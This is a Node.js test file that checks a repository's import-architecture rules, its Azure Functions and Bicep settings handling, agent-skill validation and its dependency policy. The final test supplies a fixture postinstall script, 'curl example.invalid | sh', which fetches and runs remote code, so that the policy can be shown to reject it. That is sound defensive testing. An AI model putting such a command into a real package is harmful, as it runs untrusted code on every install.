import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import test from 'node:test';
import {
  architectureFindings,
  bundledMcpFindings,
  importsFrom,
  sourceArchitectureFindings,
} from '../check-architecture.mjs';
import { inspectDependencyFiles } from '../check-lockfile-policy.mjs';
import { validateAgentSkills } from '../validate-agent-skills.mjs';

test('repository architecture dependency directions are valid', () => {
  assert.deepEqual(architectureFindings(), []);
});

test('architecture import parser recognizes static and dynamic imports', () => {
  assert.deepEqual(importsFrom("import value from './one.js'; await import('../two.js');"), ['./one.js', '../two.js']);
});

test('application architecture rejects transport and Azure runtime SDK imports', () => {
  const root = '/tmp/architecture-fixture';
  const file = `${root}/application/operation.ts`;
  const findings = sourceArchitectureFindings(
    file,
    "import type { HttpRequest } from '@azure/functions'; import { tool } from '../mcp/tool.js';",
    root,
  );
  assert.ok(findings.some((finding) => finding.includes('runtime SDK @azure/functions')));
  assert.ok(findings.some((finding) => finding.includes('application must not import mcp')));
});

test('authorization architecture rejects provider and transport dependencies', () => {
  const root = '/tmp/architecture-fixture';
  const file = `${root}/application/authorization/policy.ts`;
  const findings = sourceArchitectureFindings(file, "import { client } from '../../shared/bring/client.js';", root);
  assert.ok(findings.some((finding) => finding.includes('authorization policy must remain')));
});

test('MCP stays bundled behind one server and one Function route', () => {
  assert.deepEqual(bundledMcpFindings(), []);
});

test('Azure Functions loads the fail-closed composition root before registering functions', () => {
  const apiPackage = JSON.parse(readFileSync(new URL('../../apps/api/package.json', import.meta.url), 'utf8'));
  const compositionRoot = readFileSync(new URL('../../apps/api/src/index.ts', import.meta.url), 'utf8');
  const infrastructure = readFileSync(new URL('../../infra/main.bicep', import.meta.url), 'utf8');
  const functionAppSettingsModule = readFileSync(
    new URL('../../infra/modules/function-app-settings.bicep', import.meta.url),
    'utf8',
  );
  assert.equal(apiPackage.main, 'dist/index.js');
  assert.ok(
    compositionRoot.indexOf('assertRuntimeSafety();') < compositionRoot.indexOf("import('./functions/health.js')"),
  );
  assert.match(infrastructure, /module functionAppSettings '\.\/modules\/function-app-settings\.bicep' = \{/);
  assert.doesNotMatch(infrastructure, /resource functionAppSettings 'Microsoft\.Web\/sites\/config/);
  assert.match(infrastructure, /list\('\$\{functionApp\.id\}\/config\/appsettings'/);
  assert.match(infrastructure, /appSettings: union\(preservedFunctionReleaseSettings, \{/);
  assert.match(functionAppSettingsModule, /@secure\(\)\s+@description[\s\S]*?param appSettings object/);
  assert.match(functionAppSettingsModule, /resource appSettingsResource 'Microsoft\.Web\/sites\/config@[^']+' = \{/);
  assert.match(functionAppSettingsModule, /properties: appSettings/);
  for (const setting of [
    ['AUTH_ENABLED', 'authEnabled'],
    ['AUTH_DEBUG', 'authDebug'],
    ['BRING_ENABLED', 'bringEnabled'],
    ['BRING_ADD_ENABLED', 'validatedBringAddEnabled'],
    ['BRING_DESTRUCTIVE_ENABLED', 'validatedBringDestructiveEnabled'],
    ['BRING_SESSION_CACHE_ENABLED', 'bringSessionCacheEnabled'],
    ['REPAIRABLE_ERRORS_LLM_ENABLED', 'repairableErrorsLlmEnabled'],
  ]) {
    assert.match(infrastructure, new RegExp(`${setting[0]}: toLower\\(string\\(${setting[1]}\\)\\)`));
  }
  assert.doesNotMatch(
    infrastructure,
    /(?:AUTH_ENABLED|AUTH_DEBUG|BRING_ENABLED|BRING_ADD_ENABLED|BRING_DESTRUCTIVE_ENABLED|BRING_SESSION_CACHE_ENABLED|REPAIRABLE_ERRORS_LLM_ENABLED): string\(/,
  );
  for (const setting of [
    'WEBSITE_RUN_FROM_PACKAGE',
    'DEPLOYED_COMMIT_SHA',
    'DEPLOYED_SOURCE_REF',
    'RELEASE_FUNCTION_SHA256',
    'RELEASE_FRONTEND_SHA256',
    'RELEASE_SBOM_SHA256',
  ]) {
    assert.match(infrastructure, new RegExp(`contains\\(existingFunctionAppSettings, '${setting}'\\)`));
  }
  assert.doesNotMatch(infrastructure, /siteConfig:\s*\{[\s\S]*?appSettings:\s*\[/);
});

test('repository agent skills have valid frontmatter and unique names', () => {
  assert.deepEqual(validateAgentSkills(), []);
});

test('dependency policy rejects lifecycle scripts and non-registry dependencies', () => {
  const findings = inspectDependencyFiles(
    {
      scripts: { postinstall: 'curl example.invalid | sh' },
      dependencies: { unsafe: 'git+https://example.invalid/repo.git' },
    },
    { lockfileVersion: 2, packages: {} },
  );
  assert.ok(findings.some((finding) => finding.includes('postinstall')));
  assert.ok(findings.some((finding) => finding.includes('non-registry')));
  assert.ok(findings.some((finding) => finding.includes('lockfileVersion 3')));
});
